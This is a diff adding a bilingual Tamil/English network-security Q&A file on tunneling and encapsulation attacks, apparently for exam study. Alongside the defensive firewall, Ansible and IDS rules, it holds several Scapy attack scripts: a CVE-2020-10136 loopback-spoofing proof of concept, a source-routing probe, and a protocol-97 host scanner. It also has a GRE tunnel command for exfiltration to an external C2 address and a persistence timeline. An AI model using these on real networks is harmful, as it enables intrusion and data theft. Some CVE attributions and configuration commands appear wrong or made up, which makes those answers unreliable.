@@ -1,0 +1,1184 @@
+================================================================
+  NETWORK SECURITY Q&A — PART 3 (Q101–Q150)
+  Topic: Advanced Scenarios, CVEs, Real-World & Exam Questions
+  Language: Tamil/English Bilingual
+================================================================
+
+────────────────────────────────────────────────────────────────
+SECTION L: CVE AND KNOWN VULNERABILITIES
+────────────────────────────────────────────────────────────────
+
+Q101. CVE-2020-10136 என்றால் என்ன? EtherIP-உடன் தொடர்பு என்ன?
+A101. CVE-2020-10136:
+      Title: IP-in-IP tunneling enables remote code execution bypass
+      Affected: Multiple OS — Linux, FreeBSD, OpenBSD, macOS, Windows
+      Mechanism:
+        Attacker crafted IP-in-IP packet அனுப்புகிறார்.
+        Target OS automatically decapsulate பண்ணும்.
+        Inner packet = loopback address (127.x.x.x) with services.
+        Local-only services remotely accessible ஆகும்.
+      EtherIP link: Same tunneling abuse concept — proto 97 via proto 4.
+      CVSS: 5.3 (Medium)
+      Fix: Firewall filter proto 4, kernel patch, source validation.
+
+────────────────────────────────────────────────────────────────
+
+Q102. Cisco ASA GRE-related CVE எதாவது தெரியுமா?
+A102. Notable Cisco ASA GRE CVEs:
+      CVE-2016-6369:
+        ASA GRE packet processing DoS
+        Remote unauthenticated attacker crafted GRE = crash
+        CVSS: 7.8 (High)
+
+      CVE-2018-0228:
+        ASA GRE/IPSec tunnel interface buffer overflow
+        Specially crafted GRE packet = DoS
+
+      CVE-2014-2176:
+        ASA inspect gre bypass — inner traffic not inspected
+        Inner malicious payload evaded inspection
+
+      Lesson: GRE inspection code = complex = historically buggy.
+      Always patch ASA before enabling GRE inspection.
+
+────────────────────────────────────────────────────────────────
+
+Q103. Linux kernel IP-in-IP tunnel CVE-2020-10136 proof of concept?
+A103. PoC (educational/defensive reference):
+      # Attacker machine
+      from scapy.all import *
+
+      # Outer IP: target public IP
+      # Inner IP: loopback 127.0.0.1 (or 169.254.x.x)
+      pkt = IP(dst="TARGET_IP", proto=4) / \
+            IP(src="127.0.0.1", dst="127.0.0.1") / \
+            TCP(dport=22) / Raw(b"exploit_payload")
+      send(pkt)
+
+      # Linux kernel decapsulates outer IP
+      # Inner packet treated as local (from 127.0.0.1)
+      # Local firewall rules bypass ஆகும்
+      # SSH service (loopback only) remotely reachable
+
+      Defense:
+        iptables -A INPUT -p 4 -j DROP (unless needed)
+        rp_filter = 1 (reverse path validation)
+
+────────────────────────────────────────────────────────────────
+
+Q104. SIP ALG CVE NAT Slipstreaming-உடன் எவ்வாறு தொடர்புடையது?
+A104. SIP ALG CVE connection:
+      CVE-2020-16028, CVE-2021-26084 (related ALG issues):
+      NAT Slipstreaming v2.0 (2021):
+        - H.323, SIP ALG உள்ள routers exploit பண்ணுகிறார்கள்
+        - Browser → crafted HTTP → SIP/H.323 payload injection
+        - NAT device ALG rewrites packet → port expose
+        - Any internal port remotely accessible
+      Encapsulation link: Application data (SIP) encapsulated in HTTP.
+      Prevention:
+        - Disable SIP ALG (if VoIP not needed)
+        - Update router firmware
+        - Strict HTTP Content-Type validation
+
+────────────────────────────────────────────────────────────────
+
+Q105. FortiGate SSL VPN CVE encapsulation bypass-உடன் link?
+A105. FortiGate SSL VPN CVEs:
+      CVE-2018-13379: Path traversal → credential theft
+      CVE-2022-42475: Heap overflow in SSL VPN daemon
+      CVE-2023-27997: Remote code execution pre-auth
+
+      Encapsulation link:
+      - SSL VPN = TLS encapsulated network traffic
+      - CVE exploit → attacker gains VPN endpoint control
+      - From VPN endpoint: GRE/EtherIP tunnels create possible
+      - Inner network fully accessible via compromised VPN
+
+      Lesson: VPN endpoint security = critical.
+      Compromised VPN host = tunnel pivot point.
+
+────────────────────────────────────────────────────────────────
+SECTION M: REAL-WORLD ATTACK SCENARIOS
+────────────────────────────────────────────────────────────────
+
+Q106. APT (Advanced Persistent Threat) group GRE tunneling எவ்வாறு use பண்றார்கள்?
+A106. Real-world APT GRE usage:
+      APT32 (OceanLotus):
+        - Custom GRE C2 channels (not HTTP/HTTPS)
+        - GRE traffic appears as "VPN" to network monitors
+        - Inner payload: custom encrypted C2 protocol
+
+      Turla (Russian APT):
+        - Satellite-based GRE covert channels
+        - One-way GRE through satellite broadcast
+        - IDS cannot detect (one-directional unusual path)
+
+      Detection hint:
+        - GRE traffic to non-VPN destinations = suspicious
+        - Unusual GRE endpoint countries = alert
+        - Long duration GRE flows without business justification
+
+────────────────────────────────────────────────────────────────
+
+Q107. Data exfiltration GRE tunnel வழியே எவ்வாறு possible?
+A107. Exfiltration via GRE:
+      Scenario:
+      1. Attacker internal foothold establish பண்ணுகிறார்
+      2. GRE tunnel to external C2 server create பண்ணுகிறார்
+         ip tunnel add gre0 mode gre remote 203.0.113.200 local <internal>
+      3. Sensitive data inner payload-ல் pack பண்ணுகிறார்
+      4. GRE = protocol 47 → many firewalls allow for VPN
+      5. Data leaves as "VPN traffic"
+
+      Detection:
+      - Baseline normal GRE peers
+      - Alert on new GRE endpoints
+      - DLP on inner GRE payload (NGFW needed)
+      - Unusual data volume via GRE
+
+────────────────────────────────────────────────────────────────
+
+Q108. Cloud environment (AWS/Azure) encapsulation attack risk?
+A108. Cloud-specific risks:
+      AWS:
+        - VPC allows GRE between instances (default)
+        - Security Groups don't filter proto 97 by default
+        - EC2 instance → EtherIP → bypass SG rules possible
+        - Mitigation: NACLs explicit deny for proto 97/4
+
+      Azure:
+        - NSG (Network Security Group) default = deny all inbound
+        - But VNet peering GRE = possible
+        - Azure Firewall needed for protocol-level inspection
+
+      GCP:
+        - VPC firewall default deny inbound
+        - Cloud Armor for L7 inspection
+        - Protocol 97 not common use case = should be blocked
+
+      Common: Cloud-native firewalls = L4 (TCP/UDP focus).
+      Protocol 97/4 rules explicitly needed.
+
+────────────────────────────────────────────────────────────────
+
+Q109. Container environment (Docker/Kubernetes) encapsulation risk?
+A109. Container encapsulation risks:
+      Docker:
+        - Default bridge network = no L3 filtering
+        - Container → host kernel → proto 97 possible
+        - iptables rules on host = applies to containers
+        - But privileged containers bypass iptables!
+
+      Kubernetes:
+        - CNI plugins (Calico, Flannel) use encapsulation!
+        - Flannel = VXLAN (UDP 4789) or GRE encapsulation
+        - Calico = IP-in-IP (proto 4) by default!
+        - Attacker compromises pod → uses Calico tunneling
+        - Network policy = L4 only, not L3 proto inspection
+
+      Fix: Calico BGP mode (no encapsulation), strict NetworkPolicy.
+
+────────────────────────────────────────────────────────────────
+
+Q110. Industrial Control System (ICS/SCADA) encapsulation attack risk?
+A110. ICS/SCADA specific risks:
+      Scenario:
+      1. IT/OT network segmented by firewall
+      2. OT network allows GRE for historian data
+      3. Attacker compromises IT machine
+      4. GRE tunnel through firewall into OT segment
+      5. Modbus/DNP3 traffic tunnel பண்ணலாம்
+      6. PLC/RTU devices manipulate possible
+
+      Real incident: TRITON/TRISIS malware
+        - Safety Instrumented System targeted
+        - Network pivoting via encapsulation
+      
+      ICS-specific prevention:
+        - Unidirectional gateways (hardware data diodes)
+        - Protocol whitelisting (Modbus, DNP3 only)
+        - GRE explicitly blocked at IT/OT boundary
+
+────────────────────────────────────────────────────────────────
+SECTION N: PROTOCOL INTERACTION AND EDGE CASES
+────────────────────────────────────────────────────────────────
+
+Q111. Double encapsulation attack — GRE inside GRE என்ன நடக்கும்?
+A111. Double GRE (GRE-in-GRE):
+      Outer: GRE tunnel (proto 47) to hop 1
+      Inner: GRE tunnel (proto 47) to hop 2
+      Payload: Malicious traffic
+
+      Attack benefit:
+      1. NGFW outer GRE inspect பண்ணும் → inner GRE miss
+      2. Hop 1 outer decapsulate → forward inner GRE
+      3. Hop 2 inner decapsulate → malicious payload deliver
+
+      Detection: Check inner protocol type in GRE header.
+      GRE header Protocol Type field:
+        0x0800 = inner IPv4
+        0x86DD = inner IPv6
+        0x0800 with inner proto=47 = double GRE!
+
+      Prevention: Max tunnel depth limit (ASA: 2 levels default).
+
+────────────────────────────────────────────────────────────────
+
+Q112. IPv6 extension headers encapsulation evasion-க்கு எவ்வாறு use ஆகும்?
+A112. IPv6 extension header abuse:
+      Extension header types:
+        0  = Hop-by-Hop Options
+        43 = Routing Header (source routing!)
+        44 = Fragment Header
+        60 = Destination Options
+
+      Attack:
+      1. IPv6 Routing Header Type 0 = source routing (deprecated RFC 5095)
+      2. Fragment Header = tiny fragments evade deep inspection
+      3. Destination Options = covert data channel
+      4. Many IDS skip extension headers = blind spot
+
+      6in4 + IPv6 routing header = double threat.
+
+      Cisco: ipv6 source-route disable (drops routing header)
+      Linux: sysctl net.ipv6.conf.all.disable_ipv6_routing_header = 1
+
+────────────────────────────────────────────────────────────────
+
+Q113. VXLAN vs EtherIP — security perspective வேறுபாடு?
+A113. VXLAN vs EtherIP comparison:
+      VXLAN (UDP 4789):
+        - Data center overlay (modern)
+        - UDP-based (port 4789)
+        - 24-bit VNID (16M segments)
+        - MAC-in-UDP
+        - Easy to filter: block UDP 4789
+
+      EtherIP (Proto 97):
+        - Legacy tunnel protocol (RFC 3378, 2002)
+        - Raw IP protocol 97
+        - No authentication, no encryption
+        - MAC-in-IP
+        - Harder to detect (unusual protocol number)
+
+      Security: Both carry L2 frames.
+      EtherIP = more dangerous (no auth, no encryption, less monitored).
+      VXLAN = easier to control (UDP port filtering).
+
+────────────────────────────────────────────────────────────────
+
+Q114. MPLS label spoofing encapsulation bypass real scenario?
+A114. MPLS bypass scenario:
+      Network: Service provider MPLS backbone
+      Attacker: Access to CE (Customer Edge) router
+      Attack:
+      1. Forge MPLS label stack (push operation)
+      2. Label = core network VPN label (obtained via reconnaissance)
+      3. Packet enters MPLS network with forged label
+      4. P routers forward based on label (no L3 check)
+      5. Reach target VPN segment without authorization
+
+      Prevention:
+        - Label filtering at PE routers
+        - BGP community-based label validation
+        - MPLS TTL propagation (detect misuse)
+        - LDP MD5 authentication
+
+────────────────────────────────────────────────────────────────
+
+Q115. IP TTL manipulation encapsulation detection evasion?
+A115. TTL manipulation:
+      Normal: TTL decrements each hop.
+      Attack: Set TTL = exact hop count to target.
+      Packet dies before IDS sensor hop.
+
+      Combined with encapsulation:
+      1. Outer IP TTL = exact hops to IDS
+      2. Outer packet dies at IDS (TTL expired)
+      3. But inner packet continues (IDS never sees inner)
+      Wait — this doesn't work directly.
+
+      Real evasion: TTL analysis bypass:
+        - IDS reassembles based on TTL ordering
+        - Inject high-TTL packets with different content
+        - Real low-TTL packet is actual payload
+        - IDS sees decoy, host reassembles real
+
+      Prevention: Normalize TTL at perimeter (ip verify ttl).
+
+────────────────────────────────────────────────────────────────
+SECTION O: EXAM-STYLE SCENARIO QUESTIONS
+────────────────────────────────────────────────────────────────
+
+Q116. Scenario: Firewall logs-ல் protocol 97 traffic 10.1.1.50 → 8.8.8.8 தெரிகிறது.
+      என்ன நடக்கிறது? Next steps என்ன?
+A116. Analysis:
+      10.1.1.50 = internal host
+      8.8.8.8 = Google DNS (external)
+      Protocol 97 = EtherIP
+
+      What's happening:
+      Internal host external server-க்கு EtherIP tunnel create பண்றது.
+      Possible: Data exfiltration, C2 channel, malware activity.
+      Google DNS (8.8.8.8) is unusual EtherIP target — likely spoofed.
+
+      Next steps:
+      1. Block 10.1.1.50 temporarily at firewall
+      2. Capture full PCAP from 10.1.1.50
+      3. Isolate host from network
+      4. Endpoint forensics: netstat -an, process list
+      5. Check: any new tunnel interfaces (ip link show)
+      6. IR: escalate to SOC
+
+────────────────────────────────────────────────────────────────
+
+Q117. Scenario: Pen test-ல் Cisco IOS router-ல் "ip options drop" not configured.
+      என்ன attacks possible? Demonstrate பண்ண எப்படி?
+A117. Possible attacks:
+      1. LSR-based MITM: nmap --ip-options L <router_ip> <target>
+      2. Network topology mapping: nmap --ip-options R <target>
+      3. Timestamp fingerprinting: nmap --ip-options T <target>
+
+      Demonstration (pen test):
+      Scapy LSR test:
+        from scapy.all import *
+        pkt = IP(dst="192.168.1.1",
+                 options=IPOption_LSRR(routers=["10.0.0.1","192.168.2.1"])
+                ) / ICMP()
+        resp = sr1(pkt, timeout=2)
+        if resp:
+            print("LSR accepted! Path:", resp)
+
+      Report: "Source routing not blocked — MITM possible"
+      Remediation: ip options drop
+
+────────────────────────────────────────────────────────────────
+
+Q118. Scenario: Corporate network-ல் Linux servers fresh install-ல்
+      GRE மற்றும் EtherIP default allow. Immediate hardening steps?
+A118. Immediate hardening (in order):
+      Step 1: Apply iptables rules NOW
+        iptables -A INPUT   -p 97 -j DROP
+        iptables -A FORWARD -p 97 -j DROP
+        iptables -A INPUT   -p 47 ! -s <vpn_peer> -j DROP
+        iptables -A FORWARD -p 4  -j DROP
+        iptables -A FORWARD -p 41 -j DROP
+
+      Step 2: Persist rules
+        iptables-save > /etc/iptables/rules.v4
+        systemctl enable netfilter-persistent
+
+      Step 3: sysctl
+        net.ipv4.conf.all.accept_source_route = 0
+        sysctl -p
+
+      Step 4: Disable unused modules
+        echo "blacklist ip_gre" >> /etc/modprobe.d/blacklist.conf
+        echo "blacklist ipip"   >> /etc/modprobe.d/blacklist.conf
+
+      Step 5: Verify + document
+
+────────────────────────────────────────────────────────────────
+
+Q119. Scenario: FortiGate firewall-ல் policy deny all உள்ளது. அப்படியும்
+      Proto 47 traffic pass ஆகிறது. ஏன்?
+A119. Root cause analysis:
+      Possible reasons:
+      1. Management access policy = "permit any any" with GRE
+      2. SSL VPN policy override = broad permit
+      3. VIP (Virtual IP) rule with broad service = allow all proto
+      4. One-arm mode = routing before firewall policy
+      5. FortiGate HA heartbeat = GRE between HA members (internal)
+      6. Route-based VPN = GRE tunnel treated as VPN traffic
+
+      Troubleshoot:
+        diagnose sniffer packet any 'proto 47' 4 0
+        diagnose firewall iprope lookup <src_ip> 0 \
+          <dst_ip> 0 <policy_id>
+        get router info routing-table all
+
+      Fix: Explicit service object "GRE" in deny policy.
+
+────────────────────────────────────────────────────────────────
+
+Q120. Scenario: Windows Server 2019-ல் Proto 41 traffic outbound detected.
+      Admin IPv6 configure பண்ணவில்லை. ஏன்?
+A120. Root cause:
+      Windows 6to4 auto-tunnel (enabled by default):
+      - Windows automatically detects IPv4 public address
+      - 6to4 address = 2002::<IPv4>::/48 automatically assigned
+      - Proto 41 packets automatically generated/accepted
+      - No manual configuration needed!
+
+      Verify:
+        netsh interface 6to4 show state  → "Enabled" or "Automatic"
+        ipconfig /all → "Tunnel adapter 6TO4..."
+
+      This is normal Windows behavior — NOT an attack necessarily.
+      But = security risk if IPv6 not managed.
+
+      Fix:
+        netsh interface 6to4 set state disabled
+        netsh interface teredo set state disabled
+        netsh interface isatap set state disabled
+
+────────────────────────────────────────────────────────────────
+
+Q121. Selective allow implementation-ல் ACL reordering தேவைப்பட்டால்?
+A121. ACL reorder process (Cisco IOS):
+      Problem: Named ACL-ல் sequence number reorder தேவை.
+      Method 1: Sequence numbers use பண்ணு:
+        ip access-list extended TUNNEL-POLICY
+          10 permit 47 host 203.0.113.10 any
+          20 permit 47 any host 203.0.113.10
+          30 deny 47 any any log
+          40 permit ip any any
+
+      Method 2: New entry insert:
+        ip access-list extended TUNNEL-POLICY
+          15 permit 47 host 203.0.113.30 any  ← insert between 10 and 20
+
+      Remove specific line:
+        ip access-list extended TUNNEL-POLICY
+          no 20  ← removes line 20
+
+      View sequence numbers:
+        show ip access-lists TUNNEL-POLICY
+
+────────────────────────────────────────────────────────────────
+
+Q122. GRE over IPSec vs plain GRE — security difference?
+A122. Comparison:
+      Plain GRE (Proto 47):
+        - No encryption
+        - No authentication
+        - No integrity check
+        - Payload visible to anyone
+
+      GRE over IPSec:
+        - GRE = tunnel, IPSec = security
+        - ESP encryption (Proto 50) wraps GRE
+        - IKE authentication required
+        - Much more secure
+
+      Attack perspective:
+        Plain GRE = attacker can inject packets into tunnel
+        GRE/IPSec = need to break IKE/ESP to inject
+
+      Config (Cisco):
+        crypto map GRE_IPSEC 10 ipsec-isakmp
+          set peer 203.0.113.10
+          set transform-set ESP-AES256-SHA
+          match address GRE-TRAFFIC
+
+────────────────────────────────────────────────────────────────
+
+Q123. Tunnel endpoint authentication — best practices?
+A123. Authentication methods:
+      GRE Key:
+        tunnel key 12345678  (weak — just a number match)
+
+      GRE over IPSec:
+        Pre-shared key or certificate auth
+        IKEv2 preferred over IKEv1
+
+      VxLAN:
+        No native auth — rely on network segmentation
+
+      EtherIP:
+        NO authentication mechanism! (RFC 3378 explicitly)
+        Only option: wrap in IPSec
+
+      Best practice hierarchy:
+      1. GRE/IPSec with certificates = best
+      2. GRE/IPSec with PSK = good
+      3. GRE with key = weak
+      4. Plain GRE = unacceptable for untrusted networks
+      5. EtherIP anywhere = unacceptable
+
+────────────────────────────────────────────────────────────────
+
+Q124. Zero Trust Architecture encapsulation attacks எவ்வாறு handle பண்ணும்?
+A124. Zero Trust approach:
+      Principle: "Never trust, always verify"
+      Encapsulation application:
+      1. Every tunnel must be authenticated (certificate/identity)
+      2. Micro-segmentation = even trusted tunnel limited
+      3. Continuous inspection = inner payload always inspected
+      4. Least privilege = tunnel only to specific destinations
+      5. Logging = all tunnel events logged and analyzed
+
+      Tools:
+      - BeyondCorp (Google) — identity over tunnel
+      - Zscaler Private Access — proxy tunnel inspection
+      - Palo Alto Prisma — NGFW + tunnel control
+
+      Key difference from traditional: Even GRE from "trusted" IP
+      is inspected at application level.
+
+────────────────────────────────────────────────────────────────
+
+Q125. Encapsulation attack timeline — discovery to exploitation?
+A125. Attack timeline:
+      T+0: Reconnaissance
+        nmap -sO target (find proto support)
+        Check firewall rules via timing side-channel
+
+      T+1h: Initial test
+        Send single proto 97 packet
+        Check for response (no ICMP unreachable = allowed)
+
+      T+2h: Tunnel setup
+        Create EtherIP tunnel interface
+        Test basic connectivity
+
+      T+4h: Exploitation
+        ARP spoofing via inner L2 frame
+        VLAN hopping test
+        Data collection
+
+      T+8h: Persistence
+        Scheduled job re-creates tunnel
+        Covert C2 channel established
+
+      Detection window: T+1h (if monitoring in place)
+      Average detection without monitoring: Weeks-months.
+
+────────────────────────────────────────────────────────────────
+SECTION P: PROTOCOL SPECIFIC DEEP DIVES
+────────────────────────────────────────────────────────────────
+
+Q126. GRE header byte structure விளக்கு (bit-level)?
+A126. GRE header (RFC 2784):
+      Byte 0-1: Flags and Version
+        Bit 0:   Checksum Present (C)
+        Bit 1:   Reserved (0)
+        Bit 2:   Key Present (K)
+        Bit 3:   Sequence Number Present (S)
+        Bits 4-12: Reserved (0)
+        Bits 13-15: Version (0)
+      Byte 2-3: Protocol Type (EtherType of inner payload)
+        0x0800 = IPv4
+        0x86DD = IPv6
+        0x0806 = ARP
+      Optional (if flags set):
+        Checksum (2 bytes) + Reserved (2 bytes)
+        Key (4 bytes)
+        Sequence Number (4 bytes)
+      Hex example: 00 00 08 00 = simple GRE with IPv4 inner
+
+────────────────────────────────────────────────────────────────
+
+Q127. EtherIP 16-bit header exact bit layout?
+A127. EtherIP header (RFC 3378):
+      Total: 16 bits (2 bytes)
+      Bits 0-3:  Version = 0x3 (binary: 0011)
+      Bits 4-15: Reserved = 0x000 (must be zero)
+
+      Byte representation:
+        Byte 0: 0011 xxxx → 0x30 (version=3, reserved upper bits)
+        Byte 1: xxxx xxxx → 0x00 (reserved lower bits)
+      Hex value: 30 00
+
+      In Scapy:
+        EtherIP().version = 3
+        EtherIP().reserved = 0
+        bytes(EtherIP()) == b'\x30\x00'
+
+      Wireshark display:
+        "EtherIP Version: 3, Reserved: 0"
+      Suspicious: Version != 3 or Reserved != 0 = malformed/attack.
+
+────────────────────────────────────────────────────────────────
+
+Q128. IPv4 IP Options field byte structure — LSR option விளக்கு?
+A128. LSR option byte structure:
+      Option Type: 0x83 (131 decimal)
+        Bits 0: Copied = 1 (copy to all fragments)
+        Bits 1-2: Class = 00 (control)
+        Bits 3-7: Number = 00011 (LSR)
+      Length: variable (3 + 4 * number_of_hops)
+      Pointer: points to next hop to record
+      Route data: list of 4-byte IP addresses
+
+      Example (2-hop LSR):
+        83 0B 04 C0 A8 01 01 C0 A8 02 01
+        |  |  |   +---IP1---+ +---IP2---+
+        |  |  pointer=4
+        |  length=11
+        type=0x83 (LSR)
+
+      Wireshark: ip.options.type == 0x83
+
+────────────────────────────────────────────────────────────────
+
+Q129. Protocol 41 (6in4) header structure?
+A129. 6in4 structure:
+      Outer IPv4 header:
+        Protocol = 41
+        Source = IPv4 endpoint A
+        Destination = IPv4 endpoint B
+      Inner IPv6 header:
+        Full IPv6 packet (40-byte fixed header)
+        No additional wrapper!
+      Protocol 41 = IPv4 protocol field value 41 = "IPv6"
+      This directly means: IPv6 packet follows IPv4 header.
+
+      Detection:
+        tcpdump -i eth0 proto 41
+        Wireshark: ip.proto == 41
+      Verify inner IPv6:
+        After 20 bytes (IPv4 header), version nibble = 6 (0x60)
+
+────────────────────────────────────────────────────────────────
+
+Q130. ICMP tunneling vs IP-Options abuse — detection difference?
+A130. Comparison:
+      ICMP Tunneling:
+        - Uses ICMP echo request/reply payload
+        - Tool: icmptunnel, hans
+        - Detection: ICMP payload != 0 (should be padding)
+          Large ICMP payload size (>64 bytes suspicious)
+          Frequency: constant ICMP stream
+
+      IP-Options Abuse (LSR/SSR):
+        - Uses IP header options field
+        - Single packet enough for recon
+        - Detection: ip.options present in header
+          ipopts keyword in Snort
+
+      ICMP = data channel. IP Options = routing manipulation.
+      Different attack goals, different detection methods.
+      Snort ICMP tunnel rule:
+        alert icmp any any -> any any
+          (msg:"ICMP data channel"; dsize:>100; sid:4000001;)
+
+────────────────────────────────────────────────────────────────
+SECTION Q: TOOLS AND AUTOMATION
+────────────────────────────────────────────────────────────────
+
+Q131. Scapy-ல் EtherIP packet craft பண்ண complete script?
+A131. Complete Scapy script:
+      from scapy.all import *
+
+      def create_etherip_packet(outer_src, outer_dst,
+                                 inner_src_mac, inner_dst_mac,
+                                 inner_src_ip, inner_dst_ip):
+          # Outer IPv4 header (proto=97)
+          outer = IP(src=outer_src, dst=outer_dst, proto=97)
+          # EtherIP header (2 bytes: version=3, reserved=0)
+          etherip_hdr = Raw(b"\x30\x00")
+          # Inner Ethernet frame
+          inner_eth = Ether(src=inner_src_mac, dst=inner_dst_mac)
+          # Inner IPv4 payload
+          inner_ip = IP(src=inner_src_ip, dst=inner_dst_ip) / ICMP()
+          # Assemble
+          pkt = outer / etherip_hdr / inner_eth / inner_ip
+          return pkt
+
+      pkt = create_etherip_packet(
+          "192.168.1.100", "10.0.0.1",
+          "aa:bb:cc:dd:ee:ff", "ff:ff:ff:ff:ff:ff",
+          "172.16.0.1", "172.16.0.2"
+      )
+      send(pkt, verbose=True)
+
+────────────────────────────────────────────────────────────────
+
+Q132. Python script-ல் network scan பண்ணி which hosts accept proto 97?
+A132. Proto 97 scan script:
+      from scapy.all import *
+      import ipaddress
+
+      def scan_etherip(network_cidr):
+          hosts_accepting = []
+          network = ipaddress.IPv4Network(network_cidr)
+
+          for host in network.hosts():
+              target = str(host)
+              pkt = IP(dst=target, proto=97, ttl=64) / \
+                    Raw(b"\x30\x00" + b"\x00"*14)
+              resp = sr1(pkt, timeout=0.5, verbose=0)
+
+              if resp is not None:
+                  if ICMP not in resp or resp[ICMP].type != 3:
+                      # Not "protocol unreachable" = possibly accepted
+                      hosts_accepting.append(target)
+                      print(f"[+] {target} accepts proto 97")
+              else:
+                  # No response = might be filtered (silent drop)
+                  pass
+
+          return hosts_accepting
+
+      results = scan_etherip("192.168.1.0/24")
+
+────────────────────────────────────────────────────────────────
+
+Q133. Bash script — daily encapsulation protocol audit for Cisco devices?
+A133. Cisco audit script:
+      #!/bin/bash
+      DEVICES=("192.168.1.1" "192.168.1.2" "10.0.0.1")
+      USER="auditor"
+      PASS="AuditPass123"
+      REPORT="/var/audit/encap-$(date +%Y%m%d).txt"
+
+      echo "Encapsulation Protocol Audit" > $REPORT
+      echo "Date: $(date)" >> $REPORT
+      echo "" >> $REPORT
+
+      for DEVICE in "${DEVICES[@]}"; do
+          echo "=== Device: $DEVICE ===" >> $REPORT
+          sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
+            $USER@$DEVICE "show ip access-lists" 2>/dev/null \
+            | grep -E "proto (4|41|47|97)" >> $REPORT
+
+          sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
+            $USER@$DEVICE "show running | include ip options" \
+            >> $REPORT 2>/dev/null
+          echo "" >> $REPORT
+      done
+      echo "Audit complete: $REPORT"
+
+────────────────────────────────────────────────────────────────
+
+Q134. Wireshark display filter — complete encapsulation analysis?
+A134. Comprehensive Wireshark filters:
+      # All encapsulation protocols
+      ip.proto == 97 or ip.proto == 47 or ip.proto == 4 or ip.proto == 41
+
+      # EtherIP only
+      ip.proto == 97
+
+      # GRE only
+      gre
+
+      # IP-in-IP
+      ip.proto == 4
+
+      # IPv6-in-IPv4
+      ip.proto == 41
+
+      # IP with any options
+      ip.options
+
+      # Specific option: LSR
+      ip.options.type == 0x83
+
+      # Record Route
+      ip.options.type == 0x07
+
+      # GRE with inner IPv4
+      gre.proto == 0x0800
+
+      # EtherIP traffic to/from specific host
+      ip.proto == 97 and (ip.src == 192.168.1.100 or
+                          ip.dst == 192.168.1.100)
+
+────────────────────────────────────────────────────────────────
+
+Q135. Ansible playbook — encapsulation block rules multiple Linux hosts-ல் deploy?
+A135. Ansible playbook:
+      ---
+      - name: Block Encapsulation Protocols
+        hosts: linux_servers
+        become: yes
+        tasks:
+          - name: Block EtherIP (proto 97)
+            iptables:
+              chain: FORWARD
+              protocol: "97"
+              jump: DROP
+              comment: "Block EtherIP RFC3378"
+
+          - name: Block IP-in-IP (proto 4)
+            iptables:
+              chain: FORWARD
+              protocol: "4"
+              jump: DROP
+              comment: "Block IP-in-IP"
+
+          - name: Block 6in4 (proto 41)
+            iptables:
+              chain: FORWARD
+              protocol: "41"
+              jump: DROP
+              comment: "Block IPv6-in-IPv4"
+
+          - name: Allow GRE from trusted peers only
+            iptables:
+              chain: FORWARD
+              protocol: "47"
+              source: "{{ item }}"
+              jump: ACCEPT
+            loop: "{{ trusted_gre_peers }}"
+
+          - name: Block all other GRE
+            iptables:
+              chain: FORWARD
+              protocol: "47"
+              jump: DROP
+
+          - name: Save iptables rules
+            command: iptables-save > /etc/iptables/rules.v4
+
+────────────────────────────────────────────────────────────────
+SECTION R: QUICK REFERENCE AND FINAL CONCEPTS
+────────────────────────────────────────────────────────────────
+
+Q136. Protocol numbers அனைத்தும் quick reference table?
+A136. Complete reference:
+      Proto  | Name      | RFC    | Risk  | Default (Most Vendors)
+      -------|-----------|--------|-------|----------------------
+      1      | ICMP      | 792    | Low   | ALLOW
+      4      | IP-in-IP  | 2003   | HIGH  | ALLOW (IOS/Linux)
+      6      | TCP       | 793    | -     | ALLOW
+      17     | UDP       | 768    | -     | ALLOW
+      41     | IPv6/6in4 | 4213   | HIGH  | ALLOW (Win/Linux)
+      47     | GRE       | 2784   | HIGH  | ALLOW (most)
+      50     | ESP       | 4303   | MED   | ALLOW (VPN)
+      51     | AH        | 4302   | MED   | ALLOW (VPN)
+      89     | OSPF      | 2328   | LOW   | Block (untrust)
+      97     | EtherIP   | 3378   | HIGH  | ALLOW (IOS/Linux/F5)
+      103    | PIM       | 4601   | LOW   | Block (untrust)
+      132    | SCTP      | 4960   | LOW   | ALLOW
+
+────────────────────────────────────────────────────────────────
+
+Q137. IP Options type numbers complete reference?
+A137. IP Options reference:
+      Type | Name                | RFC   | Sec Risk
+      -----|---------------------|-------|----------
+      0    | End of Option List  | 791   | None
+      1    | No Operation (NOP)  | 791   | None
+      7    | Record Route        | 791   | MEDIUM (topology)
+      68   | Internet Timestamp  | 791   | MEDIUM (fingerprint)
+      82   | Traceroute          | 1393  | LOW
+      130  | Security            | 1108  | LOW
+      131  | Loose Source Route  | 791   | HIGH (MITM)
+      136  | Stream ID           | 791   | LOW
+      137  | Strict Source Route | 791   | HIGH (bypass)
+      148  | Router Alert        | 2113  | HIGH (DoS)
+      149  | SDBM               | -     | LOW
+      205  | Quick-Start         | 4782  | LOW
+
+────────────────────────────────────────────────────────────────
+
+Q138. Encapsulation attack vs tunneling legitimate use — difference?
+A138. Legitimate vs malicious:
+      Legitimate tunneling:
+      - Authorized VPN (GRE/IPSec) with known endpoints
+      - Documented business need
+      - Authentication required (IKE, certificates)
+      - Logged and monitored
+      - Encrypted (IPSec ESP)
+
+      Malicious encapsulation:
+      - Unauthorized tunnel (no firewall rule permits it)
+      - Unknown endpoints (new external IPs)
+      - No authentication (plain GRE, EtherIP)
+      - Not logged (covert channel)
+      - Unencrypted or self-encrypted
+      - Abnormal traffic patterns (time, volume)
+
+      Detection clue: Authorized tunnels = documented, expected.
+      Unexpected proto 47/97 = investigate immediately.
+
+────────────────────────────────────────────────────────────────
+
+Q139. Security audit checklist — encapsulation protocol review?
+A139. Audit checklist:
+      □ ip options drop configured? (Cisco IOS)
+      □ show asp drop ip-option-drop count? (ASA)
+      □ ACL: deny proto 97 any any? (all platforms)
+      □ ACL: deny proto 4 any any? (unless IP-in-IP VPN)
+      □ GRE permit from known peers only?
+      □ Proto 41 blocked or controlled?
+      □ Windows hosts: 6to4/Teredo disabled?
+      □ Linux: iptables rules persistent?
+      □ Linux: sysctl accept_source_route = 0?
+      □ NGFW tunnel inspection enabled?
+      □ IDS rules for encap protocols active?
+      □ NetFlow monitoring unusual protocols?
+      □ SIEM alerts for proto 97/4/47/41 from unknown?
+      □ Last pen test included encap bypass testing?
+      □ Incident response plan for tunnel attack?
+
+────────────────────────────────────────────────────────────────
+
+Q140. RFC reference list — encapsulation protocols?
+A140. RFC reference:
+      RFC 791  — IPv4 (IP options defined here)
+      RFC 792  — ICMP
+      RFC 2003 — IP Encapsulation within IP (Proto 4)
+      RFC 2113 — IP Router Alert Option
+      RFC 2784 — GRE (Generic Routing Encapsulation)
+      RFC 2890 — GRE Key and Sequence Number Extensions
